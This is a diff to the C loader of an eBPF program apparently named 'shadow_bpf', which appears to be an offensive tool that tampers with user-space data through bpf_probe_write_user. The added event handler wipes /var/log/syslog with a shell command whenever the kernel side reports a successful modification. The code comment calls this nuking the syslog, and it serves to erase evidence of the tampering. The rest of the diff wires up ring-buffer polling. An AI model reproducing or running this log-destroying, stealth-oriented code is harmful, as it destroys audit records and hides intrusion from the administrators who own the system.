@@ -68,6 +68,18 @@ static bool setup()
     return true;
 }
 
+static int handle_event(void *ctx, void *data, size_t data_sz)
+{
+    const struct event *e = data;
+    /* nuke the syslog if we used bpf_probe_write_user to modify msg */
+    if (e->success) {
+        fprintf(stderr, "Cleaning up syslog\n");
+        system("> /var/log/syslog"); 
+    }
+
+    return 0;
+}
+
 int main(int argc, char **argv)
 {
     struct shadow_bpf *skel = NULL;
@@ -113,10 +125,28 @@ int main(int argc, char **argv)
         goto cleanup;
     }
 
+    /* setup ring buffer */
+    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
+    if (!rb) {
+        err = -1;
+        fprintf(stderr, "Failed to create ring buffer!\n");
+        goto cleanup;
+    }
+
     printf("Successfully started!\n"); 
 
-    while (!exiting)
-        sleep(1);
+    while (!exiting) {
+        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
+        /* Ctrl+C causes -EINTR */
+        if (err == -EINTR) {
+            err = 0;
+            break;
+        }
+        if (err < 0) {
+            fprintf(stderr, "Error polling ring buffer: %d\n", err);
+            break;
+        }
+    }
 
 cleanup:
     shadow_bpf__destroy(skel);
